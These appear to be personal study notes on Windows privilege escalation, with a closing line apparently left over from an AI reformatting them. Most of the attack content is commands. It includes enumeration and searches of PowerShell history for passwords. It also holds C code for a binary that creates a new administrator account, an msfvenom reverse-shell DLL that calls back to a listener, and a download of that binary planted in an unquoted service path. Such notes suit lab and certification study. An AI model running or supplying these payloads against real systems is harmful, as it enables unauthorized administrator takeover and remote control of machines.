# Windows Privilege Escalation Notes

## Skipping Theory on Windows Access Control Mechanisms

---

## 🔍 Situational Awareness

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

### System and User Information
```powershell
# Get username and group memberships
whoami /groups

# Get hostname
hostname
```

### User Enumeration
```powershell
# Local Users
net user steve
Get-LocalUser

# Domain Users
Get-ADUser -Filter *
Get-ADUser -Identity dave -Properties *
net user /domain
net user dave /domain
```

### Group Enumeration
```powershell
# Local Groups
Get-LocalGroup
Get-LocalGroupMember adminteam
net localgroup
net localgroup Administrators

# Domain Groups
net group /domain
net group "Domain Admins" /domain
Get-ADGroup -Filter * | Select-Object Name
Get-ADGroupMember -Identity "Domain Admins"
```

### System and Network Information
```powershell
# Get system details
systeminfo

# Get network interfaces
ipconfig /all

# Get routing table
route print

# Get active network connections
netstat -ano
```

### Installed Applications
```powershell
# 32-bit Applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64-bit Applications
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

### Running Applications
```powershell
Get-Process
```

### Finding Files
```powershell
# Find database files (KeePass, etc.)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Find configuration files
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Find sensitive documents
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
🔹 Some files may not be accessible under your user but could be accessible to others.

### Running Commands as Another User
```powershell
runas /user:backupadmin cmd
```

---

## 🛠 PowerShell Goldmine

### PowerShell Transcription Files & History
```powershell
# Get PowerShell history
Get-History

# View history file location
(Get-PSReadlineOption).HistorySavePath

# Read PowerShell history
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Searching for Sensitive Information
```powershell
Select-String -Path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Pattern "password|runas|Invoke"
```

### Checking Windows Event Logs for PowerShell Execution
```powershell
Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Select-Object -ExpandProperty Message
```

### Checking PowerShell Transcription Logs
```powershell
Get-ChildItem -Path C:\Users\ -Recurse -Filter PowerShell_transcript*.txt | Get-Content
```

==**Transcript Files**==
Also there might be other script or transcript files which you may find in the PSReadLine.
===Transcript=== files may be stored in transcript folder in Users Public Transcript or in the users directory.

The logged information is stored in transcript files, which may be saved in:
- User home directories
- A central directory for all users of a machine
- A network share collecting logs from multiple machines

PowerShell **stores history in a plain text file** at:
```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

View it
```
`Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
```

**🔹 Looking for specific keywords (e.g., passwords, runas, Invoke)?**
```
Select-String -Path $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Pattern "password|runas|Invoke"
```

Check Windows Event Logs for PowerShell Execution
```
Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Select-Object -ExpandProperty Message
```
Check PowerShell Transcription Logs
```
C:\Users\<username>\Documents\PowerShell_transcript.*
```
Find and real all transcripts
```
Get-ChildItem -Path C:\Users\ -Recurse -Filter PowerShell_transcript*.txt | Get-Content
```



---

## 🤖 Automated Enumeration Tools
- [SeatBelt](https://github.com/GhostPack/Seatbelt)
- [JAWS](https://github.com/411Hall/JAWS)
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

🔹 Note: These tools may not detect all vulnerabilities and can sometimes misidentify the Windows version.

---

## 🔥 Leveraging Windows Services

- **Started, stopped, or modified** using:
    
    - **Services Snap-in (`services.msc`)**
    - **PowerShell (`Get-Service`, `Start-Service`, etc.)**
    - **Command line (`sc.exe`, `net start`, etc.)**
      
### Enumerate Running Services
```powershell
Get-Service | Where-Object { $_.Status -eq "Running" }
```

### Find Services Running as a Non-Admin User
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
```

### Checking Permissions on Service Binaries
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |
C Code for a malicious binary.

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
Or use a reverse shell.
Cross Compiling
```
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

#### Modifying Services for Privilege Escalation
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile
```
There are other services which are suggested with it the only way of finding which services are vulnerable for sure is via manual enumeration. Also this might miss some sevices.

### Restarting Services or System
```powershell
shutdown /r /t 0
```

---

## 🎭 DLL Hijacking

Just like hijacking binaries we will hijack dlls used by binary.

Either u can just replace the dll used by the service or use dll search order.
### 🏛 **Old (Legacy) DLL Search Order (Before Windows 7 & Server 2008 R2)**

By default, Windows used this **insecure** DLL search order:

1. **The directory of the executable**
2. **The system directory** (`C:\Windows\System32\`)
3. **The 16-bit system directory** (`C:\Windows\System\`)
4. **The Windows directory** (`C:\Windows\`)
5. **The current working directory (CWD)** ⬅️ **This made DLL hijacking easy!**
6. **The directories listed in `PATH` (environment variable)**
    - First, user directories in `PATH`
    - Then, system directories in `PATH`
### 🛡 **New (Secure) DLL Search Order (Windows 7 & Server 2008 R2 and later)**

To mitigate DLL hijacking, Microsoft introduced **Safe DLL Search Mode** and **DLL Redirection**:

1. **The directory of the executable**
2. **The system directory** (`C:\Windows\System32\`)
3. **The 16-bit system directory** (`C:\Windows\System\`)
4. **The Windows directory** (`C:\Windows\`)
5. **The directories listed in `PATH` (environment variable)**
    - First, user directories in `PATH`
    - Then, system directories in `PATH`
6. **The current working directory (CWD)** ⬅️ **Moved to the last position!**

Finding this vulnerability is easy because u just have to find installed softwares and other running services or something else and u can google them to find what services vulnerable to dll hijacking


### Finding Potential DLL Hijacking Opportunities
```powershell
PS C:\Users\steve> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
select displayname

Get-Process | Select-Object ProcessName, Path

Get-CimInstance -ClassName Win32_Service | Select-Object Name, PathName, StartMode
```
- Also look in downloads, Program Files , App Data and other folders where such information can be found.
- Also check Writable DLL Locations 
- `icacls "C:\Program Files\VulnerableApp\*.dll"`
  
### Creating a Malicious DLL
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.240 LPORT=4444 -f dll -o reverse.dll
```

### Deploying a Malicious DLL
```powershell
icacls "C:\Program Files\VulnerableApp\*.dll"
```

---

## 🔗 Unquoted Service Paths

### Finding Services with Unquoted Paths
We can use this attack when we can write to the programs parent directory.


```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

```
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

Name                      State   PathName
----                      -----   --------
...
GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
...
```

Another command u can use to find services without quotes.
- `Get-WmiObject Win32_Service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^".*"$' } | Select-Object Name, DisplayName, PathName
- `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`


```
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```

```
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```
_BUILTIN\Users_ has Write (w) permissions on the path **C:\Program Files\Enterprise Apps**. Our goal is now to place a malicious file named **Current.exe** in **C:\Program Files\Enterprise Apps\**.

```
PS C:\Users\steve> iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe

PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```


---

## ⏳ Scheduled Tasks Exploitation
```powershell
schtasks /query /fo LIST /v
```
```powershell
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

🔹 If the task is running under a privileged user, replacing the executable can lead to privilege escalation.

---

## 🛠 Exploiting Privileges & Patches

### Checking Privileges
```powershell
whoami /priv
```

### Checking System Info and Installed Patches
```powershell
systeminfo

# Installed Patches
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

---

This structured format improves readability while preserving all essential details from your notes.

